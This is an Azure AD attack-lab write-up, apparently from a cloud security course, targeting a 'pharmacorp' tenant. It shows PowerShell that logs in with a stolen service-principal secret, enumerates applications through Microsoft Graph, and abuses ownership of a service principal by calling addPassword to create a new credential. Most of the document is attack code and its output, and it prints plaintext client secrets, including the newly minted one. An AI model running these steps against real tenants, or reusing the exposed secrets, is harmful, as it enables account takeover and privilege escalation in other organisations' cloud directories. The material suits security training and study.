# Attack Lab 11

Using the pharmacorp tenant identifier and credentials obtained on the attack lab 4, it's possible abuse of the credentials in Azure AD:

```
Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString '~9j8Q~f339gnUfSBxSO5yuQXM6ztfCBL8LPjXa3I' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('7e7730b1-29ab-4adf-bb20-7ae61987d01f', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user
profile ( C:\Users\studentuser107\.Azure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
7e7730b1-29ab-4adf-bb20-7ae61987d01f                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud

```

Enumeration, Get-AzADApplication:

```
PS C:\Users\studentuser107> Get-AzADApplication

DisplayName         Id                                   AppId
-----------         --                                   -----
mailapp             0a88da02-e9f4-428a-ab4e-aa94f12e1225 f0823e33-c430-4dd2-a56a-dca3c3a346a4
AbuseGraphAPIforCAP 0c9b0706-33fe-414a-955f-9b28284ce578 2b3b473a-1de0-4e44-a19c-5aa9001e02e3
AuthDemo            78e7dfaa-44f8-40bb-89d8-6d26c34a1928 175fff98-c013-4e4e-a58b-0b62de044432
resourcesapp        ee7a977f-a5f7-4790-b682-a6ea8e81701a 7e7730b1-29ab-4adf-bb20-7ae61987d01f
```
Create script for validation:
```
Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString '~9j8Q~f339gnUfSBxSO5yuQXM6ztfCBL8LPjXa3I' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('7e7730b1-29ab-4adf-bb20-7ae61987d01f', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
Get-AzADApplication
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
Write-Host "Application: resourcesapp "
$Params = @{ 
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals(appid='{7e7730b1-29ab-4adf-bb20-7ae61987d01f}')/ownedObjects"
"Method" = "GET" 
"Headers" = @{ 
"Authorization" = "Bearer $GraphToken" 
"Content-Type" = "application/json"
}
}
$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result.value

Write-Host "Application: AuthDemo "
$Params = @{ 
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals(appid='{175fff98-c013-4e4e-a58b-0b62de044432}')/ownedObjects"
"Method" = "GET" 
"Headers" = @{ 
"Authorization" = "Bearer $GraphToken" 
"Content-Type" = "application/json"
}
}
$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result.value

Write-Host "Application: AbuseGraphAPIforCAP "
$Params = @{ 
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals(appid='{2b3b473a-1de0-4e44-a19c-5aa9001e02e3}')/ownedObjects"
"Method" = "GET" 
"Headers" = @{ 
"Authorization" = "Bearer $GraphToken" 
"Content-Type" = "application/json"
}
}
$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result.value

Write-Host "Application: mailapp "
$Params = @{ 
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals(appid='{f0823e33-c430-4dd2-a56a-dca3c3a346a4}')/ownedObjects"
"Method" = "GET" 
"Headers" = @{ 
"Authorization" = "Bearer $GraphToken" 
"Content-Type" = "application/json"
}
}
$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result.value

```
Complete Output:
```
PS C:\Users\studentuser107> Import-Module C:\AzAppsec\Tools\AzureAD\AzureAD\2.0.2.140\AzureAD.psd1
$password= ConvertTo-SecureString '~9j8Q~f339gnUfSBxSO5yuQXM6ztfCBL8LPjXa3I' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('7e7730b1-29ab-4adf-bb20-7ae61987d01f', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
Get-AzADApplication
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
Write-Host "Application: resourcesapp "
$Params = @{ 
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals(appid='{7e7730b1-29ab-4adf-bb20-7ae61987d01f}')/ownedObjects"
"Method" = "GET" 
"Headers" = @{ 
"Authorization" = "Bearer $GraphToken" 
"Content-Type" = "application/json"
}
}
$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result.value

Write-Host "Application: AuthDemo "
$Params = @{ 
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals(appid='{175fff98-c013-4e4e-a58b-0b62de044432}')/ownedObjects"
"Method" = "GET" 
"Headers" = @{ 
"Authorization" = "Bearer $GraphToken" 
"Content-Type" = "application/json"
}
}
$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result.value

Write-Host "Application: AbuseGraphAPIforCAP "
$Params = @{ 
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals(appid='{2b3b473a-1de0-4e44-a19c-5aa9001e02e3}')/ownedObjects"
"Method" = "GET" 
"Headers" = @{ 
"Authorization" = "Bearer $GraphToken" 
"Content-Type" = "application/json"
}
}
$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result.value

Write-Host "Application: mailapp "
$Params = @{ 
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals(appid='{f0823e33-c430-4dd2-a56a-dca3c3a346a4}')/ownedObjects"
"Method" = "GET" 
"Headers" = @{ 
"Authorization" = "Bearer $GraphToken" 
"Content-Type" = "application/json"
}
}
$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result.value
WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user profile ( C:\Users\studentuser107\.A
zure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
7e7730b1-29ab-4adf-bb20-7ae61987d01f                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud 

AddIn                            : {}
Api                              : {
                                     "knownClientApplications": [ ],
                                     "oauth2PermissionScopes": [ ],
                                     "preAuthorizedApplications": [ ]
                                   }
AppId                            : f0823e33-c430-4dd2-a56a-dca3c3a346a4
AppRole                          : {}
ApplicationTemplateId            : 
CreatedDateTime                  : 6/20/2022 11:03:09 AM
CreatedOnBehalfOfDeletedDateTime : 
CreatedOnBehalfOfDisplayName     : 
CreatedOnBehalfOfId              : 
CreatedOnBehalfOfOdataId         : 
CreatedOnBehalfOfOdataType       : 
DeletedDateTime                  : 
Description                      : 
DisabledByMicrosoftStatus        : 
DisplayName                      : mailapp
ExtensionProperty                : 
GroupMembershipClaim             : 
HomeRealmDiscoveryPolicy         : 
Id                               : 0a88da02-e9f4-428a-ab4e-aa94f12e1225
IdentifierUri                    : {}
Info                             : {
                                   }
IsDeviceOnlyAuthSupported        : 
IsFallbackPublicClient           : 
KeyCredentials                   : {}
Logo                             : 
Note                             : 
Oauth2RequirePostResponse        : 
OdataId                          : 
OdataType                        : #microsoft.graph.application
OptionalClaim                    : {
                                   }
Owner                            : 
ParentalControlSetting           : {
                                     "countriesBlockedForMinors": [ ],
                                     "legalAgeGroupRule": "Allow"
                                   }
PasswordCredentials              : {}
PublicClient                     : {
                                     "redirectUris": [ ]
                                   }
PublisherDomain                  : pharmacorphq.onmicrosoft.com
RequiredResourceAccess           : {{
                                     "resourceAccess": [
                                       {
                                         "id": "df021288-bdef-4463-88db-98f22de89214",
                                         "type": "Role"
                                       },
                                       {
                                         "id": "810c84a8-4a9e-49e6-bf7d-12d183f40d01",
                                         "type": "Role"
                                       }
                                     ],
                                     "resourceAppId": "00000003-0000-0000-c000-000000000000"
                                   }}
SignInAudience                   : AzureADMyOrg
Spa                              : {
                                     "redirectUris": [ ]
                                   }
Tag                              : {}
TokenEncryptionKeyId             : 
TokenIssuancePolicy              : 
TokenLifetimePolicy              : 
Web                              : {
                                     "redirectUriSettings": [ ],
                                     "redirectUris": [ ],
                                     "implicitGrantSettings": {
                                       "enableAccessTokenIssuance": false,
                                       "enableIdTokenIssuance": false
                                     }
                                   }
AdditionalProperties             : {[verifiedPublisher, System.Collections.Generic.Dictionary`2[System.String,System.Object]]}


AddIn                            : {}
Api                              : {
                                     "knownClientApplications": [ ],
                                     "oauth2PermissionScopes": [ ],
                                     "preAuthorizedApplications": [ ]
                                   }
AppId                            : 2b3b473a-1de0-4e44-a19c-5aa9001e02e3
AppRole                          : {}
ApplicationTemplateId            : 
CreatedDateTime                  : 7/15/2022 7:17:22 AM
CreatedOnBehalfOfDeletedDateTime : 
CreatedOnBehalfOfDisplayName     : 
CreatedOnBehalfOfId              : 
CreatedOnBehalfOfOdataId         : 
CreatedOnBehalfOfOdataType       : 
DeletedDateTime                  : 
Description                      : 
DisabledByMicrosoftStatus        : 
DisplayName                      : AbuseGraphAPIforCAP
ExtensionProperty                : 
GroupMembershipClaim             : 
HomeRealmDiscoveryPolicy         : 
Id                               : 0c9b0706-33fe-414a-955f-9b28284ce578
IdentifierUri                    : {}
Info                             : {
                                   }
IsDeviceOnlyAuthSupported        : 
IsFallbackPublicClient           : 
KeyCredentials                   : {}
Logo                             : 
Note                             : 
Oauth2RequirePostResponse        : 
OdataId                          : 
OdataType                        : #microsoft.graph.application
OptionalClaim                    : {
                                   }
Owner                            : 
ParentalControlSetting           : {
                                     "countriesBlockedForMinors": [ ],
                                     "legalAgeGroupRule": "Allow"
                                   }
PasswordCredentials              : {{
                                     "displayName": "Auth",
                                     "endDateTime": "2025-03-17T16:57:59.8030000Z",
                                     "hint": "Kta",
                                     "keyId": "5000d2e2-baf9-4029-82dd-5adaa41a980f",
                                     "startDateTime": "2023-03-18T16:57:59.8030000Z"
                                   }, {
                                     "displayName": "AuthNew",
                                     "endDateTime": "2023-04-15T16:23:45.9130000Z",
                                     "hint": "hO4",
                                     "keyId": "d23b23f0-b134-47ce-8144-034d0d14f52a",
                                     "startDateTime": "2022-10-15T16:23:45.9130000Z"
                                   }, {
                                     "displayName": "Auth",
                                     "endDateTime": "2023-03-29T11:05:18.1500000Z",
                                     "hint": "Tye",
                                     "keyId": "c03a9a04-8442-4cc4-bb93-6fe88ce358e3",
                                     "startDateTime": "2022-09-29T11:05:18.1500000Z"
                                   }}
PublicClient                     : {
                                     "redirectUris": [ ]
                                   }
PublisherDomain                  : pharmacorphq.onmicrosoft.com
RequiredResourceAccess           : {{
                                     "resourceAccess": [
                                       {
                                         "id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d",
                                         "type": "Scope"
                                       },
                                       {
                                         "id": "246dd0d5-5bd0-4def-940b-0421030a5b68",
                                         "type": "Role"
                                       },
                                       {
                                         "id": "01c0a623-fc9b-48e9-b794-0756f8e8f067",
                                         "type": "Role"
                                       }
                                     ],
                                     "resourceAppId": "00000003-0000-0000-c000-000000000000"
                                   }}
SignInAudience                   : AzureADMyOrg
Spa                              : {
                                     "redirectUris": [ ]
                                   }
Tag                              : {}
TokenEncryptionKeyId             : 
TokenIssuancePolicy              : 
TokenLifetimePolicy              : 
Web                              : {
                                     "redirectUriSettings": [ ],
                                     "redirectUris": [ ],
                                     "implicitGrantSettings": {
                                       "enableAccessTokenIssuance": false,
                                       "enableIdTokenIssuance": false
                                     }
                                   }
AdditionalProperties             : {[verifiedPublisher, System.Collections.Generic.Dictionary`2[System.String,System.Object]]}


AddIn                            : {}
Api                              : {
                                     "knownClientApplications": [ ],
                                     "oauth2PermissionScopes": [ ],
                                     "preAuthorizedApplications": [ ]
                                   }
AppId                            : 175fff98-c013-4e4e-a58b-0b62de044432
AppRole                          : {}
ApplicationTemplateId            : 
CreatedDateTime                  : 7/25/2022 6:25:56 AM
CreatedOnBehalfOfDeletedDateTime : 
CreatedOnBehalfOfDisplayName     : 
CreatedOnBehalfOfId              : 
CreatedOnBehalfOfOdataId         : 
CreatedOnBehalfOfOdataType       : 
DeletedDateTime                  : 
Description                      : 
DisabledByMicrosoftStatus        : 
DisplayName                      : AuthDemo
ExtensionProperty                : 
GroupMembershipClaim             : 
HomeRealmDiscoveryPolicy         : 
Id                               : 78e7dfaa-44f8-40bb-89d8-6d26c34a1928
IdentifierUri                    : {}
Info                             : {
                                   }
IsDeviceOnlyAuthSupported        : 
IsFallbackPublicClient           : 
KeyCredentials                   : {{
                                     "customKeyIdentifier": "86502F736B6D206126A5D925BDE5A927C9516625",
                                     "displayName": "AuthTest",
                                     "endDateTime": "2024-05-22T15:44:17.0000000Z",
                                     "keyId": "a13246c1-7e6c-450c-bfbb-d9b2fb93d940",
                                     "startDateTime": "2023-05-22T15:24:17.0000000Z",
                                     "type": "AsymmetricX509Cert",
                                     "usage": "Verify"
                                   }}
Logo                             : 
Note                             : 
Oauth2RequirePostResponse        : 
OdataId                          : 
OdataType                        : #microsoft.graph.application
OptionalClaim                    : {
                                   }
Owner                            : 
ParentalControlSetting           : {
                                     "countriesBlockedForMinors": [ ],
                                     "legalAgeGroupRule": "Allow"
                                   }
PasswordCredentials              : {{
                                     "displayName": "AuthTest",
                                     "endDateTime": "2025-05-21T15:52:29.6390000Z",
                                     "hint": ".6-",
                                     "keyId": "2335009a-67de-42fe-8da8-cb6abf8442a9",
                                     "startDateTime": "2023-05-22T15:52:29.6390000Z"
                                   }}
PublicClient                     : {
                                     "redirectUris": [ ]
                                   }
PublisherDomain                  : pharmacorphq.onmicrosoft.com
RequiredResourceAccess           : {{
                                     "resourceAccess": [
                                       {
                                         "id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d",
                                         "type": "Scope"
                                       }
                                     ],
                                     "resourceAppId": "00000003-0000-0000-c000-000000000000"
                                   }}
SignInAudience                   : AzureADMyOrg
Spa                              : {
                                     "redirectUris": [ ]
                                   }
Tag                              : {}
TokenEncryptionKeyId             : 
TokenIssuancePolicy              : 
TokenLifetimePolicy              : 
Web                              : {
                                     "redirectUriSettings": [ ],
                                     "redirectUris": [ ],
                                     "implicitGrantSettings": {
                                       "enableAccessTokenIssuance": false,
                                       "enableIdTokenIssuance": false
                                     }
                                   }
AdditionalProperties             : {[verifiedPublisher, System.Collections.Generic.Dictionary`2[System.String,System.Object]]}


AddIn                            : {}
Api                              : {
                                     "knownClientApplications": [ ],
                                     "oauth2PermissionScopes": [ ],
                                     "preAuthorizedApplications": [ ]
                                   }
AppId                            : 7e7730b1-29ab-4adf-bb20-7ae61987d01f
AppRole                          : {}
ApplicationTemplateId            : 
CreatedDateTime                  : 6/20/2022 11:02:30 AM
CreatedOnBehalfOfDeletedDateTime : 
CreatedOnBehalfOfDisplayName     : 
CreatedOnBehalfOfId              : 
CreatedOnBehalfOfOdataId         : 
CreatedOnBehalfOfOdataType       : 
DeletedDateTime                  : 
Description                      : 
DisabledByMicrosoftStatus        : 
DisplayName                      : resourcesapp
ExtensionProperty                : 
GroupMembershipClaim             : 
HomeRealmDiscoveryPolicy         : 
Id                               : ee7a977f-a5f7-4790-b682-a6ea8e81701a
IdentifierUri                    : {}
Info                             : {
                                   }
IsDeviceOnlyAuthSupported        : 
IsFallbackPublicClient           : 
KeyCredentials                   : {}
Logo                             : 
Note                             : 
Oauth2RequirePostResponse        : 
OdataId                          : 
OdataType                        : #microsoft.graph.application
OptionalClaim                    : {
                                   }
Owner                            : 
ParentalControlSetting           : {
                                     "countriesBlockedForMinors": [ ],
                                     "legalAgeGroupRule": "Allow"
                                   }
PasswordCredentials              : {{
                                     "displayName": "Secret",
                                     "endDateTime": "2023-12-18T12:28:21.9090000Z",
                                     "hint": "~9j",
                                     "keyId": "3347f217-144f-430f-b9ae-48fb0640ecf1",
                                     "startDateTime": "2023-06-21T11:28:21.9090000Z"
                                   }}
PublicClient                     : {
                                     "redirectUris": [ ]
                                   }
PublisherDomain                  : pharmacorphq.onmicrosoft.com
RequiredResourceAccess           : {{
                                     "resourceAccess": [
                                       {
                                         "id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d",
                                         "type": "Scope"
                                       },
                                       {
                                         "id": "9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30",
                                         "type": "Role"
                                       }
                                     ],
                                     "resourceAppId": "00000003-0000-0000-c000-000000000000"
                                   }}
SignInAudience                   : AzureADMyOrg
Spa                              : {
                                     "redirectUris": [ ]
                                   }
Tag                              : {}
TokenEncryptionKeyId             : 
TokenIssuancePolicy              : 
TokenLifetimePolicy              : 
Web                              : {
                                     "redirectUriSettings": [ ],
                                     "redirectUris": [ ],
                                     "implicitGrantSettings": {
                                       "enableAccessTokenIssuance": false,
                                       "enableIdTokenIssuance": false
                                     }
                                   }
AdditionalProperties             : {[verifiedPublisher, System.Collections.Generic.Dictionary`2[System.String,System.Object]]}

Application: resourcesapp 

@odata.type                       : #microsoft.graph.application
id                                : 0a88da02-e9f4-428a-ab4e-aa94f12e1225
deletedDateTime                   : 
appId                             : f0823e33-c430-4dd2-a56a-dca3c3a346a4
applicationTemplateId             : 
disabledByMicrosoftStatus         : 
createdDateTime                   : 2022-06-20T11:03:09Z
displayName                       : mailapp
description                       : 
groupMembershipClaims             : 
identifierUris                    : {}
isDeviceOnlyAuthSupported         : 
isFallbackPublicClient            : 
notes                             : 
publisherDomain                   : pharmacorphq.onmicrosoft.com
serviceManagementReference        : 
signInAudience                    : AzureADMyOrg
tags                              : {}
tokenEncryptionKeyId              : 
samlMetadataUrl                   : 
defaultRedirectUri                : 
certification                     : 
optionalClaims                    : 
servicePrincipalLockConfiguration : 
requestSignatureVerification      : 
addIns                            : {}
api                               : @{acceptMappedClaims=; knownClientApplications=System.Object[]; requestedAccessTokenVersion=; 
                                    oauth2PermissionScopes=System.Object[]; preAuthorizedApplications=System.Object[]}
appRoles                          : {}
info                              : @{logoUrl=; marketingUrl=; privacyStatementUrl=; supportUrl=; termsOfServiceUrl=}
keyCredentials                    : {}
parentalControlSettings           : @{countriesBlockedForMinors=System.Object[]; legalAgeGroupRule=Allow}
passwordCredentials               : {}
publicClient                      : @{redirectUris=System.Object[]}
requiredResourceAccess            : {@{resourceAppId=00000003-0000-0000-c000-000000000000; resourceAccess=System.Object[]}}
verifiedPublisher                 : @{displayName=; verifiedPublisherId=; addedDateTime=}
web                               : @{homePageUrl=; logoutUrl=; redirectUris=System.Object[]; implicitGrantSettings=; 
                                    redirectUriSettings=System.Object[]}
spa                               : @{redirectUris=System.Object[]}


@odata.type                            : #microsoft.graph.servicePrincipal
id                                     : 4a9a9c00-bf17-43d8-b437-fe8144c8df15
deletedDateTime                        : 
accountEnabled                         : True
alternativeNames                       : {}
appDisplayName                         : mailapp
appDescription                         : 
appId                                  : f0823e33-c430-4dd2-a56a-dca3c3a346a4
applicationTemplateId                  : 
appOwnerOrganizationId                 : e0f999c1-86ee-47a0-bfd5-18470154b7cd
appRoleAssignmentRequired              : False
createdDateTime                        : 2022-06-20T11:03:10Z
description                            : 
disabledByMicrosoftStatus              : 
displayName                            : mailapp
homepage                               : 
loginUrl                               : 
logoutUrl                              : 
notes                                  : 
notificationEmailAddresses             : {}
preferredSingleSignOnMode              : 
preferredTokenSigningKeyThumbprint     : 
replyUrls                              : {}
servicePrincipalNames                  : {f0823e33-c430-4dd2-a56a-dca3c3a346a4}
servicePrincipalType                   : Application
signInAudience                         : AzureADMyOrg
tags                                   : {HideApp, WindowsAzureActiveDirectoryIntegratedApp}
tokenEncryptionKeyId                   : 
samlSingleSignOnSettings               : 
addIns                                 : {}
appRoles                               : {}
info                                   : @{logoUrl=; marketingUrl=; privacyStatementUrl=; supportUrl=; termsOfServiceUrl=}
keyCredentials                         : {}
oauth2PermissionScopes                 : {}
passwordCredentials                    : {@{customKeyIdentifier=; displayName=Password; endDateTime=2025-09-28T12:31:21.1776553Z; hint=DQF; 
                                         keyId=c18622c0-ed75-4da2-9db4-ee463cba568e; secretText=; startDateTime=2023-09-28T12:31:21.1776553Z}, 
                                         @{customKeyIdentifier=; displayName=Password; endDateTime=2025-09-15T12:19:08.4826776Z; hint=C~f; 
                                         keyId=2cb38955-68cc-4268-8a89-f73edcec279c; secretText=; startDateTime=2023-09-15T12:19:08.4826776Z}, 
                                         @{customKeyIdentifier=; displayName=Password; endDateTime=2025-08-01T11:44:31.7132628Z; hint=8Tm; 
                                         keyId=f79cd763-878c-4b72-910c-250fe8fc8636; secretText=; startDateTime=2023-08-01T11:44:31.7132628Z}, 
                                         @{customKeyIdentifier=; displayName=Password; endDateTime=2025-07-16T13:06:06.0126774Z; hint=Sbp; 
                                         keyId=38020566-de42-4869-acd8-590f02513880; secretText=; startDateTime=2023-07-16T13:06:06.0126774Z}}
resourceSpecificApplicationPermissions : {}
verifiedPublisher                      : @{displayName=; verifiedPublisherId=; addedDateTime=}

Application: AuthDemo 
Application: AbuseGraphAPIforCAP 
Application: mailapp 



PS C:\Users\studentuser107> 
```

Abuse privileges from mailapp in order to obtain the credentials, of the application with the current logged user:
Source code:
```
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$URL = "https://graph.microsoft.com/v1.0/servicePrincipals/4a9a9c00-bf17-43d8-b437-fe8144c8df15/addPassword"
$Params = @{
"URI"= $URL
"Method" = "POST"
"Headers" = @{
"Content-Type" = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}
$Body = @{
"passwordCredential"= @{
"displayName" = "Password"
}
}
Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
```
Execution output:
```

PS C:\Users\studentuser107> $GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token

PS C:\Users\studentuser107> $URL = "https://graph.microsoft.com/v1.0/servicePrincipals/4a9a9c00-bf17-43d8-b437-fe8144c8df15/addPassword"
$Params = @{
"URI"= $URL
"Method" = "POST"
"Headers" = @{
"Content-Type" = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}
$Body = @{
"passwordCredential"= @{
"displayName" = "Password"
}
}

PS C:\Users\studentuser107> Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)


@odata.context      : https://graph.microsoft.com/v1.0/$metadata#microsoft.graph.passwordCredential
customKeyIdentifier : 
displayName         : Password
endDateTime         : 2025-10-08T22:47:59.0862774Z
hint                : TEg
keyId               : d0eb5763-0039-4511-9cef-8da87e8accee
secretText          : TEg8Q~DacI3Jmyg7X_ELYsYb6bTBteddfu.lQalN
startDateTime       : 2023-10-08T22:47:59.0862774Z
```
